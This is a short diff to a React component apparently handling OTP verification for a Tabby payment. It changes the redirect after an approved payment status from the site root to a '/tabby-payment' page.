@@ -84,7 +84,7 @@ const TabbyOtpVerification = () => {
           if (statusData.payment_status === "approved") {
             if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
             if (timeoutRef.current) clearTimeout(timeoutRef.current);
-            window.location.href = "/";
+            window.location.href = "/tabby-payment";
           } else if (statusData.payment_status === "rejected") {
             if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
             if (timeoutRef.current) clearTimeout(timeoutRef.current);
